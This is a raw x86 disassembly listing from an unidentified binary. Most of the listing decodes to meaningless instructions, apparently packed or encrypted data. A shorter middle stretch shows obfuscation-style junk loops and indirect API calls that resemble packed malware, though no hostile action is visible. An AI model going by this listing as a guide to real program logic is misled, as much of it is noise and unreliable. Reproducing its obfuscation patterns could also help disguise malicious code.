  409a2a:	fbstp  TBYTE PTR [edi]
  409a2c:	mov    dl,0xe6
  409a2e:	inc    ecx
  409a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a30:	inc    esp
  409a31:	mov    edx,0x582b49d0
  409a36:	xchg   ecx,eax
  409a37:	mov    ds:0x1c2b0b36,al
  409a3c:	push   ecx
  409a3d:	xchg   ebp,eax
  409a3e:	into   
  409a3f:	or     BYTE PTR [eax+eax*4+0x1386a357],bh
  409a46:	xchg   ecx,eax
  409a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a48:	mov    edi,0xb4d4dbf4
  409a4d:	std    
  409a4e:	jb     0x409a2e
  409a50:	ins    BYTE PTR es:[edi],dx
  409a51:	in     eax,dx
  409a52:	hlt    
  409a53:	sbb    BYTE PTR [edx],al
  409a55:	iret   
  409a56:	rcr    dl,0x96
  409a59:	mov    edx,0x694770ea
  409a5e:	shl    BYTE PTR [ebp-0x2d],1
  409a61:	fnstcw WORD PTR [ebx]
  409a63:	cmc    
  409a64:	hlt    
  409a65:	push   0x82a143f6
  409a6a:	xchg   ebp,eax
  409a6b:	mov    dh,0xeb
  409a6d:	in     eax,dx
  409a6e:	mov    al,0xca
  409a70:	hlt    
  409a71:	sbb    DWORD PTR [ebp+0x79],esp
  409a74:	jmp    esi
  409a76:	dec    esp
  409a77:	popa   
  409a78:	je     0x409a02
  409a7a:	inc    edx
  409a7b:	cmp    al,0x7f
  409a7d:	xor    eax,0x2c4bc657
  409a82:	sub    edi,edi
  409a84:	jb     0x409a3b
  409a86:	and    edi,DWORD PTR [ecx]
  409a88:	popf   
  409a89:	adc    ebx,DWORD PTR ds:0x8912aa80
  409a8f:	addr16 pop es
  409a91:	loope  0x409ac0
  409a93:	neg    edi
  409a95:	std    
  409a96:	push   edx
  409a97:	sbb    BYTE PTR [esi],0xb7
  409a9a:	mov    dl,0xac
  409a9c:	ins    DWORD PTR es:[edi],dx
  409a9d:	xchg   ecx,eax
  409a9e:	push   es
  409a9f:	push   es
  409aa0:	in     eax,dx
  409aa1:	inc    esi
  409aa2:	popa   
  409aa3:	call   0x3a09:0xf70db257
  409aaa:	addr16 test eax,0xb9500495
  409ab0:	mov    BYTE PTR [eax],cl
  409ab2:	xor    al,0x23
  409ab4:	das    
  409ab5:	lods   eax,DWORD PTR ds:[esi]
  409ab6:	add    BYTE PTR [ebp+0x7f57f1c2],0x95
  409abd:	js     0x409a77
  409abf:	jo     0x409ae4
  409ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ac2:	fsubr  QWORD PTR [edi-0x307ec9a]
  409ac8:	xchg   ecx,eax
  409ac9:	nop
  409aca:	jno    0x409a8f
  409acc:	push   ebp
  409acd:	ss pusha 
  409acf:	lods   eax,DWORD PTR ds:[esi]
  409ad0:	pop    ebp
  409ad1:	lea    ebp,[ecx]
  409ad3:	and    BYTE PTR [ecx-0x6dfac7cd],0xa0
  409ada:	pop    edi
  409adb:	das    
  409adc:	call   0xb75d:0xfec5f832
  409ae3:	int3   
  409ae4:	inc    ecx
  409ae5:	out    dx,al
  409ae6:	clc    
  409ae7:	into   
  409ae8:	dec    edi
  409ae9:	pop    ebp
  409aea:	aaa    
  409aeb:	data16 in al,dx
  409aed:	dec    eax
  409aee:	mov    esi,0x9697ea2a
  409af3:	or     ebp,ebx
  409af5:	push   edi
  409af6:	aaa    
  409af7:	lods   al,BYTE PTR ds:[esi]
  409af8:	xor    ah,dh
  409afa:	inc    esp
  409afb:	retf   
  409afc:	pop    ds
  409afd:	jmp    0x8d82:0x3a312945
  409b04:	pop    ebx
  409b05:	stos   BYTE PTR es:[edi],al
  409b06:	inc    ebp
  409b07:	lds    eax,FWORD PTR [esi+eax*4-0x31]
  409b0b:	lods   al,BYTE PTR ds:[esi]
  409b0c:	ja     0x409b24
  409b0e:	cmp    esp,eax
  409b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b11:	pushf  
  409b12:	mov    al,0x8
  409b14:	and    eax,0x506fd44
  409b19:	das    
  409b1a:	adc    al,0x56
  409b1c:	mov    al,0x6c
  409b1e:	push   esi
  409b1f:	sub    DWORD PTR [ecx-0x71a81a5],ecx
  409b25:	add    eax,edx
  409b27:	xchg   DWORD PTR [edi+esi*4+0x5b],edx
  409b2b:	mov    ch,0xb7
  409b2d:	jge    0x409ab7
  409b2f:	in     al,0x80
  409b31:	xchg   ecx,eax
  409b32:	jnp    0x409b93
  409b34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b35:	add    DWORD PTR [edi+eax*4+0x61fc6716],esp
  409b3c:	adc    al,0x59
  409b3e:	(bad)  
  409b3f:	(bad)  
  409b40:	in     eax,dx
  409b41:	dec    edx
  409b42:	xor    dh,BYTE PTR [esi]
  409b44:	sbb    DWORD PTR [ebp+0x3da6860e],esi
  409b4a:	pop    ecx
  409b4b:	or     eax,eax
  409b4d:	pop    esi
  409b4e:	call   0x23cc:0x738e126e
  409b55:	stos   BYTE PTR es:[edi],al
  409b56:	mov    ah,0x53
  409b58:	icebp  
  409b59:	cmp    eax,esp
  409b5b:	into   
  409b5c:	add    al,0x34
  409b5e:	ret    
  409b5f:	or     eax,0xc52ceb5a
  409b64:	out    dx,eax
  409b65:	jp     0x409bb7
  409b67:	repnz cmp ebx,ebp
  409b6a:	dec    ebp
  409b6b:	out    dx,eax
  409b6c:	not    DWORD PTR [ebx+esi*8-0xe]
  409b70:	xchg   esp,eax
  409b71:	xor    eax,0x67d8eb7b
  409b76:	fisttp WORD PTR [ebp-0x3d]
  409b79:	xor    eax,0x4bec862c
  409b7e:	mov    ah,0x88
  409b80:	inc    edi
  409b81:	push   edx
  409b82:	sub    eax,0xaf5f6d6f
  409b87:	dec    edx
  409b88:	sahf   
  409b89:	mov    ebp,0x42992e00
  409b8e:	jp     0x409ba0
  409b90:	aad    0xe0
  409b92:	mov    DWORD PTR [edx],ecx
  409b94:	mov    bl,0x67
  409b96:	out    dx,al
  409b97:	add    esi,edi
  409b99:	pop    ebp
  409b9a:	dec    esi
  409b9b:	fcom   QWORD PTR [edi-0x241045b1]
  409ba1:	fisub  DWORD PTR [esi-0x439f31dd]
  409ba7:	push   ebx
  409ba8:	xor    ebp,DWORD PTR [ebx-0x57]
  409bab:	adc    DWORD PTR [edi],edx
  409bad:	xchg   edx,eax
  409bae:	fcmovnb st,st(6)
  409bb0:	arpl   si,bx
  409bb2:	test   al,0xdc
  409bb4:	out    dx,al
  409bb5:	pop    ds
  409bb6:	lea    ebp,[edx+0x75]
  409bb9:	jg     0x409b96
  409bbb:	fcomp  QWORD PTR [edx-0x7887746d]
  409bc1:	jns    0x409bf0
  409bc3:	jo     0x409b50
  409bc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bc6:	mov    ds:0xa2122a48,al
  409bcb:	(bad)  
  409bcc:	push   0xffffffb3
  409bce:	into   
  409bcf:	aad    0x27
  409bd1:	loope  0x409bfc
  409bd3:	aaa    
  409bd4:	sub    eax,0x49bc8ae1
  409bd9:	sahf   
  409bda:	fiadd  WORD PTR [esi-0x9]
  409bdd:	inc    eax
  409bde:	adc    bh,BYTE PTR fs:[esi]
  409be1:	gs icebp 
  409be3:	pusha  
  409be4:	je     0x409c53
  409be6:	fild   WORD PTR [ecx+0x13]
  409be9:	cmc    
  409bea:	dec    esp
  409beb:	jle    0x409c3d
  409bed:	push   ss
  409bee:	push   edi
  409bef:	fcom   QWORD PTR [edx+eax*2-0x16]
  409bf3:	mov    eax,0x7b6aa4c8
  409bf8:	mov    al,ds:0x3b97f062
  409bfd:	fdivr  QWORD PTR [edx+0x49]
  409c00:	loop   0x409b8f
  409c02:	dec    esi
  409c03:	mov    ds:0x5e1bdda4,eax
  409c08:	dec    ebx
  409c09:	lahf   
  409c0a:	mov    al,ds:0x3e0bb649
  409c0f:	jnp    0x409ba7
  409c11:	mov    eax,ds:0x26c59c53
  409c16:	inc    ebx
  409c17:	adc    BYTE PTR [edi+esi*2-0x74],0xfd
  409c1c:	or     BYTE PTR [edx+0x5ce66790],dl
  409c22:	pushf  
  409c23:	pushf  
  409c24:	pop    es
  409c25:	or     BYTE PTR [edx],0x8
  409c28:	jge    0x409bde
  409c2a:	nop
  409c2b:	xchg   ebx,eax
  409c2c:	sub    al,0x4b
  409c2e:	enter  0x4032,0xe4
  409c32:	aas    
  409c33:	(bad)  
  409c34:	icebp  
  409c35:	sar    ch,cl
  409c37:	outs   dx,DWORD PTR ds:[esi]
  409c38:	loope  0x409c0d
  409c3a:	aas    
  409c3b:	pop    ebx
  409c3c:	adc    BYTE PTR [edi],dh
  409c3e:	jbe    0x409c94
  409c40:	cwde   
  409c41:	sub    al,0xe5
  409c43:	test   al,0xac
  409c45:	ds mov dh,0x5f
  409c48:	pushf  
  409c49:	gs pushw 0xaf8
  409c4e:	dec    ebx
  409c4f:	imul   edi,DWORD PTR [ecx-0x55],0x4658f111
  409c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c57:	leave  
  409c58:	jno    0x409c88
  409c5a:	xor    ch,BYTE PTR [ebx-0x13a8091a]
  409c60:	mov    edi,0x7f5beb49
  409c65:	inc    di
  409c67:	cmp    esi,ecx
  409c69:	pop    ebx
  409c6a:	mov    ebp,0x348bd00e
  409c6f:	mov    ds:0xf24cba19,eax
  409c74:	shl    BYTE PTR [esi-0x77],1
  409c77:	xlat   BYTE PTR ds:[ebx]
  409c78:	ss dec ebp
  409c7a:	push   eax
  409c7b:	sub    DWORD PTR [esi+0x21aad3cf],0xa67351da
  409c85:	xchg   edx,eax
  409c86:	cdq    
  409c87:	fcmovnb st,st(5)
  409c89:	adc    eax,0x318956d5
  409c8e:	fisttp QWORD PTR [ebx+0x7ed99144]
  409c94:	sbb    esp,DWORD PTR [ebx]
  409c96:	not    DWORD PTR [eax]
  409c98:	outs   dx,DWORD PTR ds:[esi]
  409c99:	sub    edx,DWORD PTR [eax]
  409c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c9c:	cli    
  409c9d:	dec    ebp
  409c9e:	sbb    BYTE PTR [ecx],0x95
  409ca1:	dec    eax
  409ca2:	into   
  409ca3:	shl    eax,cl
  409ca5:	bound  ebp,QWORD PTR [ebp-0x66162e49]
  409cab:	push   esp
  409cac:	dec    eax
  409cad:	mov    cl,0x83
  409caf:	add    edx,ebx
  409cb1:	adc    al,0xf9
  409cb3:	or     al,0xf0
  409cb5:	or     dl,al
  409cb7:	jne    0x409cd7
  409cb9:	lods   al,BYTE PTR ds:[esi]
  409cba:	xchg   edi,eax
  409cbb:	push   ecx
  409cbc:	repz (bad) 
  409cbe:	adc    eax,0xed0e862c
  409cc3:	lds    eax,FWORD PTR [edx-0xae3d2bb]
  409cc9:	mov    dl,0xf1
  409ccb:	popa   
  409ccc:	push   edi
  409ccd:	aaa    
  409cce:	fwait
  409ccf:	or     eax,0x7193b8ed
  409cd4:	lea    edx,[ecx+0x16]
  409cd7:	cwde   
  409cd8:	aam    0x8e
  409cda:	add    BYTE PTR [esi-0x66],bh
  409cdd:	fimul  DWORD PTR [esi-0x360cf314]
  409ce3:	popa   
  409ce4:	add    BYTE PTR [ebp-0x2f46dfee],0xa2
  409ceb:	scas   eax,DWORD PTR es:[edi]
  409cec:	cmp    dh,BYTE PTR [esi]
  409cee:	xor    edx,DWORD PTR [ebx]
  409cf0:	dec    edi
  409cf1:	test   DWORD PTR [edi+0x32],0x36f77a06
  409cf8:	inc    esi
  409cf9:	mov    ds,WORD PTR [esi+0x7a571acf]
  409cff:	ins    BYTE PTR es:[edi],dx
  409d00:	sbb    eax,DWORD PTR [esi+0x1f]
  409d03:	add    BYTE PTR [ecx-0x1f],0x4f
  409d07:	push   ss
  409d08:	(bad)  
  409d09:	jecxz  0x409d6a
  409d0b:	xlat   BYTE PTR ds:[ebx]
  409d0c:	(bad)  [ebp-0x2151574d]
  409d12:	jp     0x409cca
  409d14:	mov    edi,DWORD PTR [eax]
  409d16:	inc    esi
  409d17:	scas   eax,DWORD PTR es:[edi]
  409d18:	ja     0x409d4d
  409d1a:	(bad)  
  409d1b:	mov    dh,0x89
  409d1d:	xor    DWORD PTR [edx],0xffffff8c
  409d20:	sahf   
  409d21:	push   ecx
  409d22:	mov    ah,0x9f
  409d24:	pop    ecx
  409d25:	inc    ebp
  409d26:	cli    
  409d27:	xchg   ebp,eax
  409d28:	in     eax,0x3a
  409d2a:	loopne 0x409d41
  409d2c:	inc    ecx
  409d2d:	jp     0x409cc2
  409d2f:	mov    ds:0x8c582325,al
  409d34:	mov    esi,0x95c00db9
  409d39:	cmp    bh,BYTE PTR [esi-0x63]
  409d3c:	ins    BYTE PTR es:[edi],dx
  409d3d:	xchg   esp,eax
  409d3e:	mov    DWORD PTR [ebx],0x6b7caaa0
  409d44:	(bad)  
  409d45:	adc    eax,0xbe488d3e
  409d4a:	stos   DWORD PTR es:[edi],eax
  409d4b:	inc    ebp
  409d4c:	stos   BYTE PTR es:[edi],al
  409d4d:	pop    ebx
  409d4e:	adc    DWORD PTR fs:[ecx+0x1b259ca7],esi
  409d55:	fwait
  409d56:	mov    cl,0x98
  409d58:	xchg   edi,eax
  409d59:	ss scas al,BYTE PTR es:[edi]
  409d5b:	cmp    esp,DWORD PTR [eax]
  409d5d:	adc    ecx,eax
  409d5f:	retw   0x1db5
  409d63:	loop   0x409d74
  409d65:	push   ds
  409d66:	inc    cx
  409d68:	pop    ss
  409d69:	sbb    BYTE PTR [eax+0xf],ah
  409d6c:	xor    DWORD PTR [esi],ebp
  409d6e:	(bad)  
  409d6f:	fisttp DWORD PTR [esi-0x49]
  409d72:	and    ecx,DWORD PTR [esp+ebx*2+0x29303bc3]
  409d79:	mov    DWORD PTR [esi],esp
  409d7b:	and    edx,edx
  409d7d:	cmp    DWORD PTR [ecx],esp
  409d7f:	sbb    DWORD PTR [ecx+ebx*4-0x64],0xffffffcb
  409d84:	mov    dl,BYTE PTR [eax+0x9876c5d]
  409d8a:	aaa    
  409d8b:	stc    
  409d8c:	adc    ah,0x8c
  409d8f:	mov    esi,0xc7847ca3
  409d94:	data16 outs dx,BYTE PTR ds:[esi]
  409d96:	mov    DWORD PTR [esi-0x3f950720],ecx
  409d9c:	inc    edi
  409d9d:	mov    dh,0xa5
  409d9f:	push   esp
  409da0:	ret    
  409da1:	scas   al,BYTE PTR es:[edi]
  409da2:	gs dec esp
  409da4:	add    al,0xf2
  409da6:	stos   DWORD PTR es:[edi],eax
  409da7:	cmp    dh,ah
  409da9:	cmp    eax,0xd7453b4c
  409dae:	imul   ebp,DWORD PTR [eax-0x5e],0xfffffffe
  409db2:	js     0x409d90
  409db4:	(bad)  
  409db5:	jno    0x409d88
  409db7:	push   eax
  409db8:	stc    
  409db9:	ds and al,0xf4
  409dbc:	dec    ebx
  409dbd:	(bad)  
  409dbe:	xchg   ebx,eax
  409dbf:	add    BYTE PTR [edi],bl
  409dc1:	clc    
  409dc2:	add    cl,ah
  409dc4:	enter  0xfeed,0x99
  409dc8:	sub    al,0x99
  409dca:	mov    ?,WORD PTR [edi+0x1f8f3030]
  409dd0:	pop    es
  409dd1:	cmp    eax,0xe5529725
  409dd7:	add    eax,0xcb6cce8c
  409ddc:	and    dl,al
  409dde:	mov    eax,ds:0x3132dd16
  409de3:	lea    edi,gs:[edi+0x6d]
  409de7:	jl     0x409e16
  409de9:	lods   eax,DWORD PTR ds:[esi]
  409dea:	lea    esi,[edx]
  409dec:	out    dx,eax
  409ded:	loopne 0x409e66
  409def:	loop   0x409dc3
  409df1:	pushf  
  409df2:	cmp    al,BYTE PTR [ecx-0x488d47de]
  409df8:	xchg   edi,eax
  409df9:	mov    WORD PTR [ecx],ss
  409dfb:	fs jno 0x409e4e
  409dfe:	sbb    edi,DWORD PTR [esi]
  409e00:	test   eax,0x5ccfeff2
  409e05:	or     eax,0xdcd8b551
  409e0a:	call   0x5bf8:0x920dc879
  409e11:	dec    ecx
  409e12:	aam    0xe5
  409e14:	xor    dh,ch
  409e16:	sti    
  409e17:	or     edi,ebp
  409e19:	mov    ch,0xd1
  409e1b:	seta   BYTE PTR [ebp+0x7fbe2fb]
  409e22:	rol    DWORD PTR [esp+ebp*2],0xdf
  409e26:	mov    al,ds:0x82ba53f2
  409e2b:	cmp    ebx,DWORD PTR [esi-0x4d]
  409e2e:	pop    ecx
  409e2f:	pop    esi
  409e30:	mov    bl,0xae
  409e32:	ins    DWORD PTR es:[edi],dx
  409e33:	nop
  409e34:	mov    esp,DWORD PTR [ecx+0x679ea679]
  409e3a:	inc    esi
  409e3b:	lods   al,BYTE PTR ds:[esi]
  409e3c:	test   DWORD PTR ds:0x96f123bc,0x58ac36c4
  409e46:	imul   edi
  409e48:	push   ds
  409e49:	int3   
  409e4a:	rol    DWORD PTR [bx+si],1
  409e4d:	push   edi
  409e4e:	(bad)  
  409e4f:	(bad)  
  409e50:	retf   0x761d
  409e53:	loop   0x409e99
  409e55:	jecxz  0x409e5c
  409e57:	fnstenv [ecx+0x29cb794b]
  409e5d:	neg    ebx
  409e5f:	fs iret 
  409e61:	and    eax,0x99a20725
  409e66:	cli    
  409e67:	das    
  409e68:	mov    ch,0xd3
  409e6a:	(bad)  
  409e6c:	(bad)  
  409e6d:	mov    eax,0x15e1fd53
  409e72:	or     DWORD PTR [ebx],esp
  409e74:	xlat   BYTE PTR ds:[bx]
  409e76:	xchg   ecx,eax
  409e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e78:	aaa    
  409e79:	jae    0x409ec5
  409e7b:	daa    
  409e7c:	jbe    0x409eb3
  409e7e:	mov    ch,0x89
  409e80:	out    dx,eax
  409e81:	mov    ecx,0x6dfd4985
  409e86:	loope  0x409e91
  409e88:	in     al,dx
  409e89:	int3   
  409e8a:	dec    ebp
  409e8b:	mov    WORD PTR [edi-0x5f],gs
  409e8e:	or     ebp,esp
  409e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e91:	das    
  409e92:	lds    ebp,FWORD PTR [ebp+0x1d]
  409e95:	stos   DWORD PTR es:[edi],eax
  409e96:	mov    ebp,0x5fff45a3
  409e9b:	push   esi
  409e9c:	cmp    eax,0xd410a3e7
  409ea1:	or     DWORD PTR [edx],ebp
  409ea3:	inc    ecx
  409ea4:	sub    eax,0x142840b5
  409ea9:	mov    ecx,0x5aeab0ac
  409eae:	mov    ecx,0x8ce1f789
  409eb3:	jo     0x409eb9
  409eb5:	sbb    al,0x8e
  409eb7:	mov    ds:0xba454544,al
  409ebc:	xchg   ecx,eax
  409ebd:	(bad)  
  409ebe:	fstp   QWORD PTR [edx]
  409ec0:	cld    
  409ec1:	loopne 0x409efa
  409ec3:	dec    ebp
  409ec4:	mov    ds:0x1fdc509b,al
  409ec9:	add    al,0x5d
  409ecb:	mov    ebp,0x375948d0
  409ed0:	cmp    BYTE PTR [eax+ebx*1],ch
  409ed3:	xchg   esp,eax
  409ed4:	xchg   ecx,eax
  409ed5:	clc    
  409ed6:	cmp    BYTE PTR [ecx],cl
  409ed8:	jl     0x409ea6
  409eda:	inc    esi
  409edb:	xor    eax,0x9c0adf89
  409ee0:	add    dh,BYTE PTR [eax+0x5c]
  409ee3:	fcom   QWORD PTR [edi]
  409ee5:	shl    DWORD PTR [eax+0x46],cl
  409ee8:	(bad)  
  409ee9:	xor    bl,BYTE PTR ds:0x59d0bb35
  409eef:	mov    ch,0x50
  409ef1:	bound  edi,QWORD PTR [eax]
  409ef3:	outs   dx,DWORD PTR ds:[esi]
  409ef4:	(bad)  
  409ef5:	sub    DWORD PTR [esi+0xe777788],ebp
  409efb:	push   es
  409efc:	xchg   si,ax
  409efe:	xor    ebx,esi
  409f00:	sub    esi,edx
  409f02:	lahf   
  409f03:	das    
  409f04:	cmp    esp,ebp
  409f06:	lds    edx,FWORD PTR [ebx+0x18904b45]
  409f0c:	fisub  DWORD PTR [edi+0x29c89ddb]
  409f12:	into   
  409f13:	(bad)  
  409f15:	dec    eax
  409f16:	and    ebp,DWORD PTR [esi-0x1c]
  409f19:	jae    0x409f71
  409f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f1c:	sbb    ebx,edx
  409f1e:	adc    ah,cl
  409f20:	sub    al,0xe3
  409f22:	pop    esp
  409f23:	adc    eax,0xeb8c9902
  409f28:	add    edx,DWORD PTR [edx+0x44]
  409f2b:	(bad)  
  409f2d:	add    edi,ebp
  409f2f:	cli    
  409f30:	ins    DWORD PTR es:[edi],dx
  409f31:	fist   DWORD PTR [edi+0x3066a455]
  409f37:	cld    
  409f38:	xchg   ecx,eax
  409f39:	pop    esp
  409f3a:	sub    al,0x4a
  409f3c:	(bad)  
  409f3d:	cmovb  ecx,DWORD PTR ss:[ebp+0x5bfc3cb3]
  409f45:	or     BYTE PTR [ebx+0x267902c7],0xdf
  409f4c:	loope  0x409f8f
  409f4e:	(bad)  
  409f4f:	cmp    bh,bl
  409f51:	dec    esp
  409f52:	fcomp  QWORD PTR [edi+0x32]
  409f55:	les    edi,FWORD PTR [eax+0x2]
  409f58:	mov    eax,0x2e325423
  409f5d:	sbb    al,BYTE PTR [edi+0x7f]
  409f60:	jmp    0x9ebf:0xb5468e59
  409f67:	addr16 cld 
  409f69:	mov    dl,0x39
  409f6b:	dec    edx
  409f6c:	mov    ebp,0x7dc09769
  409f71:	call   0xe8f8a310
  409f76:	jne    0x409f68
  409f78:	aaa    
  409f79:	sub    DWORD PTR [edi],ebp
  409f7b:	repnz int3 
  409f7d:	dec    esp
  409f7e:	push   edx
  409f7f:	or     BYTE PTR [bp+di-0x6780],0x1
  409f85:	add    BYTE PTR [eax],al
  409f87:	and    DWORD PTR ds:0x429008,0x0
  409f91:	xor    edx,edx
  409f93:	add    edx,DWORD PTR ds:0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a2b4
  40a251:	pop    eax
  40a252:	cld    
  40a253:	dec    ebx
  40a254:	rol    BYTE PTR ds:0x5f4e7c7c,1
  40a25a:	jl     0x40a2d8
  40a25c:	scas   eax,DWORD PTR es:[edi]
  40a25d:	int3   
  40a25e:	jae    0x40a295
  40a260:	jmp    DWORD PTR [ebp+eiz*2-0x3f979723]
  40a267:	dec    esi
  40a268:	push   es
  40a269:	lea    ecx,[eax-0x77]
  40a26c:	pop    edi
  40a26d:	gs pushf 
  40a26f:	and    ecx,esi
  40a271:	xchg   ebx,eax
  40a272:	pop    ebx
  40a273:	neg    DWORD PTR [ebx-0x4b]
  40a276:	inc    esp
  40a277:	xor    eax,0xf96e4179
  40a27c:	cli    
  40a27d:	loop   0x40a2a2
  40a27f:	push   edi
  40a280:	aas    
  40a281:	dec    ebx
  40a282:	xchg   ebx,eax
  40a283:	setp   BYTE PTR [ebp+0x119a0d8b]
  40a28a:	popa   
  40a28b:	xor    edi,DWORD PTR [ebx-0xa]
